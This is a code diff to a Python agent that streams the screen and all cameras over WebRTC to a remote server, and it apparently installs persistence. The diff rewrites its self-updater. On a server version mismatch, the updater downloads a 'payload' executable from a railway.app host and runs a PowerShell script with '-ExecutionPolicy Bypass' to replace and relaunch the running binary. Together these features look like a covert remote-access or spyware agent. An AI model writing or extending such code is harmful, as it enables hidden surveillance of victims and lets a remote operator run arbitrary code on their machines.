@@ -21,7 +21,7 @@ import av
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.3.11-ZERO"
+AGENT_VERSION = "9.3.12-UCON"
 target_fps = 30
 
 # --- Logging System ---
@@ -101,35 +101,42 @@ install_persistence()
 class AutoUpdater:
     @staticmethod
     def update_and_restart(new_version):
-        print(f"[OTA] Update Triggered! Current: {AGENT_VERSION}, New: {new_version}")
-        import urllib.request
-        import uuid
-        exe_url = "https://web-production-d6db5.up.railway.app/api/client_exe"
-        temp_exe = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), f"mrl_agent_new_{uuid.uuid4().hex[:6]}.exe")
+        log(f"[OTA] Update Triggered! Current: {AGENT_VERSION}, New: {new_version}")
+        url = "https://web-production-d6db5.up.railway.app/api/download"
         try:
-            print("[OTA] Downloading payload...")
-            urllib.request.urlretrieve(exe_url, temp_exe)
-        except Exception as e:
-            print(f"[OTA] Download failed: {e}")
-            return
+            log("[OTA] Downloading payload...")
+            import requests
+            r = requests.get(url, stream=True)
+            temp_exe = "mrl_agent.new"
+            with open(temp_exe, "wb") as f:
+                for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
             
-        current_exe = sys.executable
-        if not current_exe.lower().endswith(".exe"):
-            print("[OTA] Not running as compiled agent (.exe). Skipping hot-swap.")
-            return
-
-        bat_file = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), "update_core.bat")
-        print("[OTA] Deploying transient hot-swap script...")
-        with open(bat_file, "w") as f:
-            f.write(f"""@echo off
-timeout /t 2 /nobreak > NUL
-move /y "{temp_exe}" "{current_exe}"
-start "" "{current_exe}"
-del "%~f0"
-""")
-        subprocess.Popen(bat_file, shell=True)
-        print("[OTA] Exiting for restart...")
-        os._exit(0)
+            log("[OTA] Deploying robust hot-swap script...")
+            ps_script = f"""
+$processId = {os.getpid()}
+Write-Host "[OTA] Waiting for process $processId to exit..."
+while (Get-Process -Id $processId -ErrorAction SilentlyContinue) {{ Start-Sleep -Seconds 1 }}
+Write-Host "[OTA] Process exited. Replacing binary..."
+$retry = 0
+while ($retry -lt 5) {{
+    try {{
+        Move-Item -Path '{temp_exe}' -Destination '{sys.executable}' -Force -ErrorAction Stop
+        Write-Host "[OTA] Replacement successful."
+        break
+    }} catch {{
+        $retry++
+        Write-Host "[OTA] File locked, retrying ($retry/5)..."
+        Start-Sleep -Seconds 2
+    }}
+}}
+Start-Process '{sys.executable}'
+"""
+            with open("updater.ps1", "w") as f: f.write(ps_script)
+            subprocess.Popen(["powershell", "-ExecutionPolicy", "Bypass", "-File", "updater.ps1"], shell=True)
+            log("[OTA] Exiting for restart...")
+            os._exit(0)
+        except Exception as e:
+            log(f"[OTA] Update failed: {e}")
 
 # Global State
 selected_monitor = 1  
@@ -439,12 +446,26 @@ async def start_session(ws, sct, client_id):
     @pc.on("icegatheringstatechange")
     async def on_icegatheringstatechange():
         log(f"[ICE] Gathering State: {pc.iceGatheringState}")
-        if pc.iceGatheringState == "complete":
-            log("[ICE] Gathering fully complete.")
 
     @pc.on("iceconnectionstatechange")
     async def on_iceconnectionstatechange():
         log(f"[ICE] Connection State: {pc.iceConnectionState}")
+
+    @pc.on("icecandidate")
+    async def on_icecandidate(candidate):
+        if candidate:
+            log(f"[ICE] Local Candidate: {candidate.component}")
+            try:
+                msg = {
+                    "t": "rtc_ice",
+                    "candidate": {
+                        "candidate": f"candidate:{candidate.foundation} {candidate.component} {candidate.protocol} {candidate.priority} {candidate.ip} {candidate.port} typ {candidate.type}",
+                        "sdpMid": candidate.sdpMid,
+                        "sdpMLineIndex": candidate.sdpMLineIndex
+                    }
+                }
+                await ws.send(orjson.dumps(msg).decode())
+            except: pass
 
     video_track = ScreenVideoTrack(sct)
     camera_track = AllCamsVideoTrack()
@@ -508,11 +529,15 @@ async def start_session(ws, sct, client_id):
                 
                 if etype == "welcome":
                     server_ver = event.get("version", "0.0.0")
-                    if server_ver != AGENT_VERSION:
+                    if server_ver != AGENT_VERSION and "--no-update" not in sys.argv:
                         AutoUpdater.update_and_restart(server_ver)
                         return
                     asyncio.create_task(pre_gather_candidates(ws, client_id))
                 elif etype == "rtc_offer":
+                    if pc.iceConnectionState in ["checking", "connected", "completed"]:
+                        log("[RTC] Offer ignored (Already connecting/connected)")
+                        continue
+                        
                     log(f"[RTC] Offer received (SDP Length: {len(event['sdp'])})")
                     # NO STUN STRIPPING - Let aiortc handle the candidates
                     await pc.setRemoteDescription(RTCSessionDescription(sdp=event["sdp"], type=event["type"]))
@@ -564,7 +589,7 @@ async def main_loop():
     
     while True:
         try:
-            async with websockets.connect(uri) as ws:
+            async with websockets.connect(uri, ping_interval=30, ping_timeout=30) as ws:
                 log("CONNECTED TO PRO SERVER")
                 client_id = get_client_id()
                 log(f"[BOOT] Client ID: {client_id}")
@@ -594,6 +619,8 @@ async def main_loop():
 if __name__ == "__main__":
     try:
         log(f"--- MRL AGENT {AGENT_VERSION} BOOT ---")
+        if "--no-update" in sys.argv:
+            log("[BOOT] OTA Updates Disabled via flag.")
         asyncio.run(main_loop())
     except KeyboardInterrupt:
         log("Quit by user.")
